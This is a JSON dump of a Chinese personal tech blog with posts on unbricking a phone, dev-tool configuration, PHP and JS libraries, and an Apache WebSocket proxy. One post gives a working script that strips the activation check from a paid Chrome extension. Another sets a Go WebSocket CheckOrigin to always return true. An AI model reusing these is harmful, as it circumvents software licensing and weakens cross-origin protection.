保留数据线刷救砖包","slug":"坚果-Pro-2-保留数据线刷救砖包","date":"2018-12-16T05:12:04.000Z","updated":"2019-01-28T14:15:57.413Z","comments":true,"path":"4c3dd4c7.html","link":"","permalink":"http://qwqaq.com/4c3dd4c7.html","excerpt":"如题，本文内容是关于保留原有数据线刷救砖包的方法。","text":"如题，本文内容是关于保留原有数据线刷救砖包的方法。 下载救砖包 链接: https://pan.baidu.com/s/1XMrgifOHc33l4ncpURtADA 提取码: 3s5i 解压到某个目录，修改目录下的 rawprogram_unsparse.xml 文件 删掉 label=&quot;userdata&quot; 的 program 标签 12345 &lt;!-- ... --&gt; &lt;program SECTOR_SIZE_IN_BYTES=\"512\" file_sector_offset=\"0\" filename=\"dummy_empty.bin\" label=\"ramdump\" num_partition_sectors=\"13631488\" partofsingleimage=\"false\" physical_partition_number=\"0\" readbackverify=\"false\" size_in_KB=\"6815744.0\" sparse=\"false\" start_byte_hex=\"0x134000000\" start_sector=\"10092544\" /&gt;- &lt;program SECTOR_SIZE_IN_BYTES=\"512\" file_sector_offset=\"0\" filename=\"dummy_empty.bin\" label=\"userdata\" num_partition_sectors=\"0\" partofsingleimage=\"false\" physical_partition_number=\"0\" readbackverify=\"false\" size_in_KB=\"0\" sparse=\"false\" start_byte_hex=\"0x2d4000000\" start_sector=\"23724032\" /&gt; &lt;program SECTOR_SIZE_IN_BYTES=\"512\" file_sector_offset=\"0\" filename=\"gpt_main0.bin\" label=\"PrimaryGPT\" num_partition_sectors=\"34\" partofsingleimage=\"true\" physical_partition_number=\"0\" readbackverify=\"false\" size_in_KB=\"17.0\" sparse=\"false\" start_byte_hex=\"0x0\" start_sector=\"0\" /&gt; &lt;!-- ... --&gt; 保存，进入 9008 模式，QFIL 刷入救砖包 再次进入 9008 刷入 twrp 进入 twrp 恢复出厂设置 开机，你会发现内存里原来的东西都还在 升级到最新 SOS -&gt; 官方最新全量包下载 (by xingrz)","categories":[{"name":"日常","slug":"日常","permalink":"http://qwqaq.com/categories/日常/"}],"tags":[{"name":"osborn","slug":"osborn","permalink":"http://qwqaq.com/tags/osborn/"},{"name":"救砖","slug":"救砖","permalink":"http://qwqaq.com/tags/救砖/"}]},{"title":"Windows 10 Insider Build 18290 ISO (19H1) 官方下载方法","slug":"Windows-10-Insider-Build-18290-ISO-19H1-官方下载方法","date":"2018-12-13T14:02:33.000Z","updated":"2019-02-19T14:38:05.392Z","comments":true,"path":"c29e2d86.html","link":"","permalink":"http://qwqaq.com/c29e2d86.html","excerpt":"Microsoft 前不久发布了内部预览版本 18290 (19H1) 的 ISO，新版本包含一些改进和许多新功能，你可以按照本文方下载 ISO 文件。","text":"Microsoft 前不久发布了内部预览版本 18290 (19H1) 的 ISO，新版本包含一些改进和许多新功能，你可以按照本文方下载 ISO 文件。 转到 Windows 官方预览版下载页，Select edition 菜单中选择你想下载的版本，例如：”Windows 10 Insider Preview - Build 18290”，然后点 “Confirm” Select the product language 菜单选择语言，例如：”Chinese Simplified”，点 “Confirm” 这时会出现下载按钮，点击即可下载你想要的版本 更多信息请看下载页里面的提示。 123456789101112131415161718192021222324252627Windows 10 Build 18290 19H1 Improvements and FixesWe fixed an issue resulting in PDFs opened in Microsoft Edge not displaying correctly (small, instead of using the entire space).We fixed an issue resulting in mouse wheel scrolling in many UWP apps and XAML surfaces being unexpectedly fast in recent builds.We’ve made some updates to the taskbar to reduce the number of times you may see the icons redraw. Most noticeably when interacting with the recycle bin, although in other scenarios as well.Antivirus apps must run as a protected process to register with Windows and appear in the Windows Security app. If an AV app does not register, Windows Defender Antivirus will remain enabled.We fixed an issue resulting in the System unexpectedly consuming a high amount of CPU for prolonged periods of time when enumerating Bluetooth devices.We fixed an issue resulting in Cortana.Signals.dll crashing in the background.We fixed an issue that caused Remote Desktop to show a black screen for some users. This same issue could also cause freezes over Remote Desktop when using VPN.We fixed an issue resulting in mapped network drivers potentially displayed as Unavailable when using the net use command, and displaying a red X in File Explorer.Improved compatibility of Narrator with Chrome.Improved performance of Magnifier centered mouse mode.We fixed an issue where the Pinyin IME would always show English mode in the taskbar, even when typing in Chinese in the previous flight.We fixed an issue resulting in languages showing an unexpected “Unavailable input method” in their list of keyboards in Settings if you added the language via Language Settings in recent flights.Thanks everyone who’s shared feedback about the new Japanese Microsoft IME introduced with Build 18272. For the moment the IME version will be returning to the one that shipped with the October 2018 Update while we take your feedback into consideration.We’ve added support for LEDBAT in uploads to Delivery Optimization peers on the same LAN (behind the same NAT). Currently LEDBAT is only used by Delivery Optimization in uploads to Group or Internet peers. This feature should prevent congestion on the local network and allow peer-to-peer upload traffic to back off instantly when the network is utilized for higher priority traffic.Windows 10 Build 18290 19H1 Known IssuesThe hyperlink colors need to be refined in Dark Mode in Sticky Notes if the Insights are enabled.Settings page will crash after changing the account password or PIN, we recommend using the CTRL + ALT + DEL method to change the passwordDue to a merge conflict, the settings for enabling/disabling Dynamic Lock are missing from Sign-in Settings. We have a fix, which will flight soon.Settings crashes when clicking on the “View storage usage on other drives” option under System &gt; Storage.The Windows Security app may show an unknown status for the Virus &amp; threat protection area, or not refresh properly. This may occur after upgrade, restart, or settings changes.Delete previous version of Windows in Configure Storage Sense is not selectable.Settings will crash when opening Speech Settings.Insiders may see green screens with error System Service Exception in win32kbase.sys when interacting with certain games and apps. We have a fix that will flight in an upcoming flight, we appreciate your patience.There’s an update block for this build in place for a small number of PCs that use Nuvoton (NTC) TPM chips with a specific firmware version (1.3.0.1) due to a bug causing issues with Windows Hello face/biometric/pin login not working. The issue is understood and a fix will flight to Insiders soon.","categories":[{"name":"Windows","slug":"Windows","permalink":"http://qwqaq.com/categories/Windows/"}],"tags":[{"name":"Windows 10","slug":"Windows-10","permalink":"http://qwqaq.com/tags/Windows-10/"},{"name":"预览版","slug":"预览版","permalink":"http://qwqaq.com/tags/预览版/"},{"name":"19H1","slug":"19H1","permalink":"http://qwqaq.com/tags/19H1/"},{"name":"ISO","slug":"ISO","permalink":"http://qwqaq.com/tags/ISO/"}]},{"title":"解决 Hyper + bash.exe 执行 clear 显示问题","slug":"解决-Hyper-bash-exe-执行-clear-显示问题","date":"2018-12-13T09:19:26.000Z","updated":"2019-01-28T14:15:57.433Z","comments":true,"path":"e3b3237d.html","link":"","permalink":"http://qwqaq.com/e3b3237d.html","excerpt":"Hyper is a terminal built on web technologies. hyper.is in the “Clear” command does not delete the entire screen only makes it available to re-register, visually disrupting the concern","text":"Hyper is a terminal built on web technologies. hyper.is in the “Clear” command does not delete the entire screen only makes it available to re-register, visually disrupting the concern Solved it I can confirm that env: { TERM: ‘cygwin’ } fixes this issue https://github.com/zeit/hyper/issues/2715","categories":[{"name":"开发工具","slug":"开发工具","permalink":"http://qwqaq.com/categories/开发工具/"},{"name":"Hyper","slug":"开发工具/Hyper","permalink":"http://qwqaq.com/categories/开发工具/Hyper/"}],"tags":[{"name":"Bash","slug":"Bash","permalink":"http://qwqaq.com/tags/Bash/"},{"name":"开发工具","slug":"开发工具","permalink":"http://qwqaq.com/tags/开发工具/"},{"name":"Hyper","slug":"Hyper","permalink":"http://qwqaq.com/tags/Hyper/"},{"name":"命令行","slug":"命令行","permalink":"http://qwqaq.com/tags/命令行/"}]},{"title":"Lazer-Database PHP使用JSON文件做数据库","slug":"Lazer-Database-PHP使用JSON文件做数据库","date":"2018-12-01T13:05:57.000Z","updated":"2018-12-01T13:29:35.038Z","comments":true,"path":"50b0de2d.html","link":"","permalink":"http://qwqaq.com/50b0de2d.html","excerpt":"Greg0/Lazer-Database 是一个 PHP 库，你能将 JSON 作为数据库进行增删改查等操作，丢掉 MySQL，这对小型项目很友好。 PHP flat-file database to store data with JSON","text":"Greg0/Lazer-Database 是一个 PHP 库，你能将 JSON 作为数据库进行增删改查等操作，丢掉 MySQL，这对小型项目很友好。 PHP flat-file database to store data with JSON 安装composer require greg0/lazer-database 使用引用类库首先，你需要定义一个常量 LAZER_DATA_PATH 存放JSON数据库文件总目录的路径 1define('LAZER_DATA_PATH', realpath(__DIR__).'/data/'); // Path to folder with tables 然后 1use Lazer\\Classes\\Database as Lazer; // example 新建数据库判断某个数据库是否存在，若不存在则新建一个 12345678910try &#123; \\Lazer\\Classes\\Helpers\\Validate::table('table_name')-&gt;exists();&#125; catch (\\Lazer\\Classes\\LazerException $e) &#123; // 若数据库不存在 Lazer::create('table_name', array( 'id' =&gt; 'integer', 'nickname' =&gt; 'string', &#123;field_name&#125; =&gt; &#123;field_type&#125; ));&#125; 查1234567891011121314151617// 查询多条数据$table = Lazer::table('table_name')-&gt;findAll();foreach($table as $row)&#123; print_r($row);&#125;// 查询单个数据$row = Lazer::table('table_name')-&gt;find(1);echo $row-&gt;id; // or $row-&gt;getField('id')// 按条件查询$row = Lazer::table('table_name')-&gt;where('name', '=', 'John')-&gt;find();echo $row-&gt;id; 增1234$row = Lazer::table('table_name');$row-&gt;nickname = 'new_user'; // or $row-&gt;setField('nickname', 'new_user')$row-&gt;save(); 改1234567$row = Lazer::table('table_name')-&gt;find(1); //Edit row with ID 1$row-&gt;set(array( 'nickname' =&gt; 'user', 'email' =&gt; 'user@example.com'));$row-&gt;save(); 删12345Lazer::table('table_name')-&gt;find(1)-&gt;delete(); //Will remove row with ID 1// ORLazer::table('table_name')-&gt;where('name', '=', 'John')-&gt;find()-&gt;delete(); //Will remove John from DB READ MORE","categories":[{"name":"GitHub Star","slug":"GitHub-Star","permalink":"http://qwqaq.com/categories/GitHub-Star/"}],"tags":[{"name":"GitHub Star","slug":"GitHub-Star","permalink":"http://qwqaq.com/tags/GitHub-Star/"}]},{"title":"BaiduPCS-Go 全速下载百度云文件","slug":"BaiduPCS-Go-全速下载百度云文件","date":"2018-12-01T12:46:27.000Z","updated":"2018-12-01T13:00:24.402Z","comments":true,"path":"c3c8f6d1.html","link":"","permalink":"http://qwqaq.com/c3c8f6d1.html","excerpt":"iikira/BaiduPCS-Go 是一款 Go 语言编写的仿 Linux shell 文件处理命令的百度网盘客户端，你可以用它来全速下载文件。除此之外，还可以上传文件、添加离线下载任务、获取下载直链、搜索文件…","text":"iikira/BaiduPCS-Go 是一款 Go 语言编写的仿 Linux shell 文件处理命令的百度网盘客户端，你可以用它来全速下载文件。除此之外，还可以上传文件、添加离线下载任务、获取下载直链、搜索文件… 普通的操作： 1234BaiduPCS-Go loginBaiduPCS-Go cd &lt;目录&gt;BaiduPCS-Go lsBaiduPCS-Go d &lt;文件名&gt;","categories":[{"name":"GitHub Star","slug":"GitHub-Star","permalink":"http://qwqaq.com/categories/GitHub-Star/"}],"tags":[{"name":"GitHub Star","slug":"GitHub-Star","permalink":"http://qwqaq.com/tags/GitHub-Star/"},{"name":"BaiduPCS-Go","slug":"BaiduPCS-Go","permalink":"http://qwqaq.com/tags/BaiduPCS-Go/"},{"name":"百度云限速","slug":"百度云限速","permalink":"http://qwqaq.com/tags/百度云限速/"},{"name":"百度云客户端","slug":"百度云客户端","permalink":"http://qwqaq.com/tags/百度云客户端/"}]},{"title":"MinecraftPE 已入正","slug":"MinecraftPE-已入正","date":"2018-11-30T15:42:20.000Z","updated":"2019-01-28T14:15:57.383Z","comments":true,"path":"c8008149.html","link":"","permalink":"http://qwqaq.com/c8008149.html","excerpt":"如今 2018，光阴飞逝，可能有 4 年没关注 MCPE。还记得每次更新，Mojang 不断跳票 + Twitter 散布各种虚假新闻，贴吧疯狂找资源，破解安卓 2.3… 的那一个个日日夜夜，入坑 MCPE 那些年，欢声笑语中流逝。想回忆一下小学时的那种感jio，Google Play 买了正版。欠了多年的债，今天终于还了 #(滑稽)","text":"如今 2018，光阴飞逝，可能有 4 年没关注 MCPE。还记得每次更新，Mojang 不断跳票 + Twitter 散布各种虚假新闻，贴吧疯狂找资源，破解安卓 2.3… 的那一个个日日夜夜，入坑 MCPE 那些年，欢声笑语中流逝。想回忆一下小学时的那种感jio，Google Play 买了正版。欠了多年的债，今天终于还了 #(滑稽) 美国区 Google Play，淘宝礼品卡充值 1.7.0 红红火火恍恍惚惚，记得当年说好 MCPE 版本号绝对不会大于 1 的 翻出了些以前耍 MCPE 的截图 那个时候 PHP 是啥都不知道（PocketMine-MP 这个开服程序是 PHP 写的） 在 MinecraftPE吧 建服务器群 小学和小伙伴们一起做的服务器地图 23333 我突然有一种感觉，感觉现在灵感越来越少了，是怎么肥事？！","categories":[{"name":"日常","slug":"日常","permalink":"http://qwqaq.com/categories/日常/"}],"tags":[{"name":"MinecraftPE","slug":"MinecraftPE","permalink":"http://qwqaq.com/tags/MinecraftPE/"},{"name":"MCPE","slug":"MCPE","permalink":"http://qwqaq.com/tags/MCPE/"}]},{"title":"JS 定义字符串，强制不处理转义字符","slug":"JS-定义字符串，强制不处理转义字符","date":"2018-11-27T09:48:27.000Z","updated":"2018-11-27T16:32:48.044Z","comments":true,"path":"24a771e4.html","link":"","permalink":"http://qwqaq.com/24a771e4.html","excerpt":"假如你想用 JS 定义一个含有路径字符串，目前在 Windows 上是用的 反斜杠 \\ 作为路径分隔符，直接复制粘贴到 “ “ 内，JS 会将 \\ 的部分视为转义字符，所以每次都要将 \\ 替换为 \\\\，麻烦啊。所以，怎么才能让 JS 强制不处理转义字符呢？使用 String.raw() 即可让 “\\” 在字符串当中不再起到转义特殊字符的作用。 MDN 是这样说的：String.raw() 是一个模板字符串的标签函数，它的作用类似于 Python 中的字符串前缀 r 和 C# 中的字符串前缀 @，是用来获取一个模板字符串的原始字面量值的。","text":"假如你想用 JS 定义一个含有路径字符串，目前在 Windows 上是用的 反斜杠 \\ 作为路径分隔符，直接复制粘贴到 “ “ 内，JS 会将 \\ 的部分视为转义字符，所以每次都要将 \\ 替换为 \\\\，麻烦啊。所以，怎么才能让 JS 强制不处理转义字符呢？使用 String.raw() 即可让 “\\” 在字符串当中不再起到转义特殊字符的作用。 MDN 是这样说的：String.raw() 是一个模板字符串的标签函数，它的作用类似于 Python 中的字符串前缀 r 和 C# 中的字符串前缀 @，是用来获取一个模板字符串的原始字面量值的。 语法12String.raw(callSite, ...substitutions)String.raw`templateString` 描述String.raw() 是唯一一个内置的模板字符串标签函数，因为它太常用了。不过它并没有什么特殊能力，你自己也可以实现一个和它功能一模一样的标签函数。 实例12345678910111213String.raw `Hi\\n!`;// \"Hi\\\\n!\"，这里得到的不是 Hi 后面跟个换行符，而是跟着 \\ 和 n 两个字符String.raw `Hi\\u000A!`;// \"Hi\\\\u000A!\"，同上，这里得到的会是 \\、u、0、0、0、A 6个字符，// 任何类型的转义形式都会失效，保留原样输出，不信你试试.lengthlet name = \"Bob\";String.raw `Hi\\n$&#123;name&#125;!`;// \"Hi\\\\nBob!\"，内插表达式还可以正常运行String.raw(&#123;raw: \"test\"&#125;, 0, 1, 2);// \"t0e1s2t\"，我认为你通常不需要把它当成普通函数来调用 浏览器兼容性 Feature Chrome Firefox (Gecko) Internet Explorer Opera Safari Basic support 41 34 (34) 未实现 未实现 未实现 参考 String.raw() - JavaScript | MDN","categories":[{"name":"JS","slug":"JS","permalink":"http://qwqaq.com/categories/JS/"}],"tags":[{"name":"ECMAScript6","slug":"ECMAScript6","permalink":"http://qwqaq.com/tags/ECMAScript6/"},{"name":"Experimental","slug":"Experimental","permalink":"http://qwqaq.com/tags/Experimental/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://qwqaq.com/tags/JavaScript/"},{"name":"Method","slug":"Method","permalink":"http://qwqaq.com/tags/Method/"},{"name":"String","slug":"String","permalink":"http://qwqaq.com/tags/String/"},{"name":"转义字符","slug":"转义字符","permalink":"http://qwqaq.com/tags/转义字符/"}]},{"title":"记录一次去除 Chrome 扩展程序激活验证的过程","slug":"记录一次去除-Chrome-扩展程序激活验证的过程","date":"2018-11-19T17:18:39.000Z","updated":"2018-11-27T16:37:47.679Z","comments":true,"path":"a845bac.html","link":"","permalink":"http://qwqaq.com/a845bac.html","excerpt":"某位骚年说是想喊我帮忙看看一个 Chrome 的扩展程序是否可以破解，去除激活验证。虽然这有些缺德，但是你要深深地明白穷*高中生的痛。我抱着试试看的心态，拿到了这个 crx 文件后，开始一步一步搞事情。Well, Here We Go…","text":"某位骚年说是想喊我帮忙看看一个 Chrome 的扩展程序是否可以破解，去除激活验证。虽然这有些缺德，但是你要深深地明白穷*高中生的痛。我抱着试试看的心态，拿到了这个 crx 文件后，开始一步一步搞事情。Well, Here We Go… Step 1首先对这个 Crx 文件进行解包，直接用 7z 等解压缩工具即可 然后你会看到这个 Chrome 扩展程序的目录结构是这样的 Step 2加载这个扩展，使用 DevTools 进行观察 找到了和激活验证相关的代码写在 \\scripts\\popup.js 里 使用工具（我用 jsnice） 尝试还原已混淆的文件 Step 3观察 popup.js 代码，发现有很多地方都使用了变量 _$_ad16，并且这个变量是一个数组 Console 敲入 _$_ad16 通过观察可知，需要把 _$_ad16[...] 全部替换成 数组 _$_ad16 中具体的值，这样 popup.js 代码才可读 所以，我写了下面这段 JS，通过替换字符串，来达到想要的效果（你可以直接在浏览器的控制台中运行以下代码） 12345678910var code = String.raw`// popup.js 代码放到这里`;var name = `_$_ad16`; // 变量名for (var i = 0; i &lt; Object.keys(window[name]).length; i++) &#123; code = code.replace(new RegExp(`$&#123;name&#125;[$&#123;i&#125;]`.replace(/([\\\\\\.\\*\\[\\]\\(\\)\\$\\^])/g,\"\\\\$1\"), 'g'), JSON.stringify(window[name][i]));&#125;console.log(code); lol 得到可读代码： Step 4直接将原来验证激活的代码注释了，然后把下图红框中的代码移到前面 23333 完成破解 成品123456789101112131415/** * 罐子屋破解 v1 (2018-11-27) */var code = String.raw`// scripts/popup.js 代码放到这里（需先 jsnice.org 反混淆）`;var name = `变量名`;for (var i = 0; i &lt; Object.keys(window[name]).length; i++) &#123; code = code.replace(new RegExp(`$&#123;name&#125;[$&#123;i&#125;]`.replace(/([\\\\\\.\\*\\[\\]\\(\\)\\$\\^])/g,\"\\\\$1\"), 'g'), JSON.stringify(window[name][i]));&#125;code = code.replace(/(document\\[[\"']addEventListener[\"']\\]\\s*\\([\"']DOMContentLoaded[\"'],\\s*function\\(*.+\\)\\s*\\&#123;)[\\s\\S]*?(\\&#125;\\));/igm, '$1\\n Popup[\"main\"]();\\n $(\"#timeEndSpan\")[\"text\"](\"永久\");\\n$2');console.log(code); 最后其实搞这种不难，并没有什么技术含量 最重要的是，我又水了一帖 #(滑稽)","categories":[{"name":"JS","slug":"JS","permalink":"http://qwqaq.com/categories/JS/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://qwqaq.com/tags/JavaScript/"},{"name":"Chrome Extension","slug":"Chrome-Extension","permalink":"http://qwqaq.com/tags/Chrome-Extension/"},{"name":"Crack","slug":"Crack","permalink":"http://qwqaq.com/tags/Crack/"},{"name":"JS 混淆","slug":"JS-混淆","permalink":"http://qwqaq.com/tags/JS-混淆/"},{"name":"去除验证","slug":"去除验证","permalink":"http://qwqaq.com/tags/去除验证/"}]},{"title":"VSCode 配置不让 C++ 程序运行一闪而过","slug":"VSCode-配置不让-C-程序运行一闪而过","date":"2018-10-16T09:15:10.000Z","updated":"2019-01-28T14:15:57.390Z","comments":true,"path":"4cd79212.html","link":"","permalink":"http://qwqaq.com/4cd79212.html","excerpt":"Visual Studio Code（简称 VSCode）是由微软开发的一个轻量且强大的代码编辑器。 最近在学 C++，调试需要配置 launch.json，所以参阅相关文档配置后，发现每次调试启动 exe 都会单独打开一个窗口，每个 .cpp 文件里都要加上 system(&quot;pause&quot;); 才能保证窗口不会一闪而过。所以… 如果能在 VSCode 自带的 Terminal 里面运行 exe 岂不是美滋滋？","text":"Visual Studio Code（简称 VSCode）是由微软开发的一个轻量且强大的代码编辑器。 最近在学 C++，调试需要配置 launch.json，所以参阅相关文档配置后，发现每次调试启动 exe 都会单独打开一个窗口，每个 .cpp 文件里都要加上 system(&quot;pause&quot;); 才能保证窗口不会一闪而过。所以… 如果能在 VSCode 自带的 Terminal 里面运行 exe 岂不是美滋滋？但似乎 VSCode 目前不支持… 参见：#634 #16890 #35 #8222 并不完美的解决方法通过配置 launch.json 的 program 为 C://Windows/System32/cmd.exe，然后 args 加上参数。但是这样断点不能用了… launch.json1234567891011121314151617181920212223242526&#123; \"version\": \"0.2.0\", \"configurations\": [ &#123; \"name\": \"(gdb) Launch\", \"type\": \"cppdbg\", \"request\": \"launch\", \"program\": \"C://Windows/System32/cmd.exe\", \"args\": [\"/c\", \"$&#123;workspaceRoot&#125;/build/$&#123;fileBasenameNoExtension&#125;.exe\", \"&amp;\", \"echo.\", \"&amp;\", \"pause\"], \"stopAtEntry\": false, \"cwd\": \"$&#123;workspaceFolder&#125;/build\", \"environment\": [], \"externalConsole\": true, \"MIMode\": \"gdb\", \"miDebuggerPath\": \"C:\\\\MinGW64\\\\bin\\\\gdb.exe\", \"setupCommands\": [ &#123; \"description\": \"Enable pretty-printing for gdb\", \"text\": \"-enable-pretty-printing\", \"ignoreFailures\": true &#125; ], \"preLaunchTask\": \"build\" &#125; ]&#125; tasks.json123456789101112131415161718192021222324252627282930313233&#123; // See https://go.microsoft.com/fwlink/?LinkId=733558 // for the documentation about the tasks.json format \"version\": \"2.0.0\", \"tasks\": [ &#123; \"label\": \"build\", \"command\": \"g++\", \"args\": [ \"-g\", \"$&#123;file&#125;\", \"-o\", \"build/$&#123;fileBasenameNoExtension&#125;.exe\" ], \"group\": &#123; \"kind\": \"build\", \"isDefault\": true &#125;, \"problemMatcher\": &#123; \"owner\": \"cpp\", \"fileLocation\": [ \"relative\", \"$&#123;workspaceRoot&#125;/build\" ], \"pattern\": &#123; \"regexp\": \"^(.*):(\\\\d+):(\\\\d+):\\\\s+(warning|error):\\\\s+(.*)$\", \"file\": 1, \"line\": 2, \"column\": 3, \"severity\": 4, \"message\": 5 &#125; &#125; &#125; ]&#125; 还有一个方法Workaround: Add this snippet to your launch.json and the internal terminal of VS Code will be used instead 😂 12345678&quot;pipeTransport&quot;: &#123; &quot;pipeCwd&quot;: &quot;/usr/bin&quot;, &quot;pipeProgram&quot;: &quot;/bin/sh&quot;, &quot;debuggerPath&quot;: &quot;/usr/bin/gdb&quot;, &quot;pipeArgs&quot;: [ &quot;-c&quot; ]&#125;, LINK P.S. 如果找到了其他方法还会继续更新的…","categories":[{"name":"开发工具","slug":"开发工具","permalink":"http://qwqaq.com/categories/开发工具/"},{"name":"VSCode","slug":"开发工具/VSCode","permalink":"http://qwqaq.com/categories/开发工具/VSCode/"}],"tags":[{"name":"VSCode","slug":"VSCode","permalink":"http://qwqaq.com/tags/VSCode/"},{"name":"Cpp","slug":"Cpp","permalink":"http://qwqaq.com/tags/Cpp/"}]},{"title":"Apache 反向代理 Http+WebSocket","slug":"Apache-反向代理-Http-WebSocket","date":"2018-09-25T16:06:54.000Z","updated":"2018-10-16T09:20:35.769Z","comments":true,"path":"665aacc7.html","link":"","permalink":"http://qwqaq.com/665aacc7.html","excerpt":"自从 Socket.IO 1.0 (May 2014) 开始, 所有的 Connection 都以一个 HTTP polling Request 开始 (more info here) 这就意味着除了转发 WebSocket 之外，你还需要转发 任何 transport=polling 的 HTTP 请求。 下面的解决方案能正确地重定向所有 Socket 流量，而不会重定向其他不关于 Socket 的流量。","text":"自从 Socket.IO 1.0 (May 2014) 开始, 所有的 Connection 都以一个 HTTP polling Request 开始 (more info here) 这就意味着除了转发 WebSocket 之外，你还需要转发 任何 transport=polling 的 HTTP 请求。 下面的解决方案能正确地重定向所有 Socket 流量，而不会重定向其他不关于 Socket 的流量。 1. 开启 mods1sudo a2enmod rewrite proxy proxy_http proxy_wstunnel 或修改 httpd.conf 12345# 找到下面的这些行，并去除开头的 # 注释符号LoadModule rewrite_module modules/mod_rewrite.soLoadModule proxy_module modules/mod_proxy.soLoadModule proxy_http_module modules/mod_proxy_http.soLoadModule proxy_wstunnel_module modules/mod_proxy_wstunnel.so 2. 对网站 *.conf 文件进行以下配置例如：/etc/apache2/sites-available/mysite.com.conf 12345678910111213141516171819202122&lt;VirtualHost *:80&gt; ServerName www.mydomain.com # Enable the rewrite engine # Requires: sudo a2enmod rewrite proxy proxy_http proxy_wstunnel # In the rules/conds, [NC] means case-insensitve, [P] means proxy RewriteEngine On # socket.io 1.0+ starts all connections with an HTTP polling request RewriteCond %&#123;QUERY_STRING&#125; transport=polling [NC] RewriteRule /(.*) http://localhost:3001/$1 [P] # When socket.io wants to initiate a WebSocket connection, it sends an # \"upgrade: websocket\" request that should be transferred to ws:// RewriteCond %&#123;HTTP:Upgrade&#125; websocket [NC] RewriteRule /(.*) ws://localhost:3001/$1 [P] # OPTIONAL: Route all HTTP traffic at /node to port 3001 ProxyRequests Off ProxyPass /node http://localhost:3001 ProxyPassReverse /node http://localhost:3001&lt;/VirtualHost&gt; I’ve included an extra section for routing /node traffic that I find handy, see here for more info. 来自 stackoverflow.com 另外，go lang 来写的 WebSocket 功能前端跨域请求出现 403 错误，改一改就好了。 12345678var upgrader = websocket.Upgrader&#123; ReadBufferSize: 1024, WriteBufferSize: 1024, // 添加下面这个 ↓ CheckOrigin: func(r *http.Request) bool &#123; return true &#125;,&#125;","categories":[{"name":"生产环境","slug":"生产环境","permalink":"http://qwqaq.com/categories/生产环境/"},{"name":"Apache","slug":"生产环境/Apache","permalink":"http://qwqaq.com/categories/生产环境/Apache/"}],"tags":[{"name":"反向代理","slug":"反向代理","permalink":"http://qwqaq.com/tags/反向代理/"},{"name":"Apache","slug":"Apache","permalink":"http://qwqaq.com/tags/Apache/"}]},{"title":"我站在巨人的肩膀上发现这个巨人也站在神的肩膀上","slug":"我站在巨人的肩膀上发现这个巨人也站在神的肩膀上","date":"2018-08-11T14:19:07.000Z","updated":"2018-10-02T06:57:52.780Z","comments":true,"path":"94b80ac2.html","link":"","permalink":"http://qwqaq.com/94b80ac2.html","excerpt":"","text":"我站在巨人的肩膀上发现这个巨人也站在神的肩膀上","categories":[{"name":"日常","slug":"日常","permalink":"http://qwqaq.com/categories/日常/"}],"tags":[]},{"title":"祝自己生日快乐","slug":"祝自己生日快乐","date":"2018-08-10T06:32:11.000Z","updated":"2018-08-14T11:12:57.105Z","comments":true,"path":"d7c5728b.html","link":"","permalink":"http://qwqaq.com/d7c5728b.html","excerpt":"嗯… 2018 年。又老了一岁，祝自己 16岁 🍰 生日快乐 😆 你最无暇的时光是哪段，你又把它奉献给了谁？ qwq","text":"嗯… 2018 年。又老了一岁，祝自己 16岁 🍰 生日快乐 😆 你最无暇的时光是哪段，你又把它奉献给了谁？ qwq 编程入坑已 3 年 💥 打算以后更多地把精力放到学习上 😂 高中奋斗 3 年 😑 仍然 “不忘初心，方得始终” 🎐","categories":[{"name":"日常","slug":"日常","permalink":"http://qwqaq.com/categories/日常/"}],"tags":[]},{"title":"解决 phpQuery 采集微信公众号乱码问题","slug":"解决-phpQuery-采集微信公众号乱码问题","date":"2018-07-31T12:26:06.000Z","updated":"2019-01-28T14:15:57.434Z","comments":true,"path":"9fe136ff.html","link":"","permalink":"http://qwqaq.com/9fe136ff.html","excerpt":"用 phpQuery 采集微信公众号文章页的内容是乱码，然而发现这并不是编码的问题，这个网页本来就是 UTF-8，那就真是奇怪了呢… 折腾了很久，也没解决这个问题，最后去看了看网页的源码，发现了…","text":"用 phpQuery 采集微信公众号文章页的内容是乱码，然而发现这并不是编码的问题，这个网页本来就是 UTF-8，那就真是奇怪了呢… 折腾了很久，也没解决这个问题，最后去看了看网页的源码，发现了… 在源码的起始和结束位置有 &lt;!--headTrap&lt;body&gt;&lt;/body&gt;&lt;head&gt;&lt;/head&gt;&lt;html&gt;&lt;/html&gt;--&gt; 和&lt;!--tailTrap&lt;body&gt;&lt;/body&gt;&lt;head&gt;&lt;/head&gt;&lt;html&gt;&lt;/html&gt;--&gt;，因为觉得这很奇怪，删掉它再尝试采集，解决了这个问题，如下： 123456789$url = \"https://mp.weixin.qq.com/s?src=11&amp;timestamp=1533000601&amp;ver=1031&amp;signature=*LFN6KjIY93ucjNZzMBCspPXRI*0VIxcQpN8alDP5GHZRuSkdqkGT8PlR9ytsfrbLfufk4Fxy3oIWTlGuOpNcj*OjGK9Wf48nFqedKxx6pwXYfTak9*dvH8vgVC7A3xW&amp;new=1\";$html = file_get_contents($url); // 建议用 Curl$html = str_replace(['&lt;!--headTrap&lt;body&gt;&lt;/body&gt;&lt;head&gt;&lt;/head&gt;&lt;html&gt;&lt;/html&gt;--&gt;', '&lt;!--tailTrap&lt;body&gt;&lt;/body&gt;&lt;head&gt;&lt;/head&gt;&lt;html&gt;&lt;/html&gt;--&gt;'], '', $html);$ql = (new QueryList())-&gt;html($html); // 导入 html$data = $ql-&gt;find('#activity-name')-&gt;text();var_dump($data); 我猜想这也许是 phpQuery 加载内容正则表达式根据 &lt;head&gt; 中的标签判断编码失误的问题 开头结尾的 &lt;!--headTrap&lt;body&gt;&lt;/body&gt;&lt;head&gt;&lt;/head&gt;&lt;html&gt;&lt;/html&gt;--&gt; 和 &lt;!--tailTrap&lt;body&gt;&lt;/body&gt;&lt;head&gt;&lt;/head&gt;&lt;html&gt;&lt;/html&gt;--&gt; 会影响 phpQuery 判断 来感受一下乱码。。。 1234array (size=1) 0 =&gt; array (size=1) 'title' =&gt; string '1603æ¾¶â��æ��é��å­§H370æ¸�æ¿�æ£«é��ç�³ç¡¶çº­î�¿î�»æ¾¶è¾«ä»�é�ªç�¸î��é��ç�·æ´�é��' (length=152) 关于之前遇到的 phpQuery 编码问题 12345// 失败的-&gt;encoding('UTF-8','GB2312')正常的，在结果集后echo iconv('GB2312', 'UTF-8', $item['title']); 我是这样解决的： 12345678910function handleGbkPage($html)&#123; $html = mb_convert_encoding($html, 'UTF-8', 'GBK'); $html = preg_replace('/charset=(gb2312|gbk)/is', 'charset=utf-8', $html); // 必须将 &lt;meta/&gt; 中 charset=* 替换为 utf-8，不然 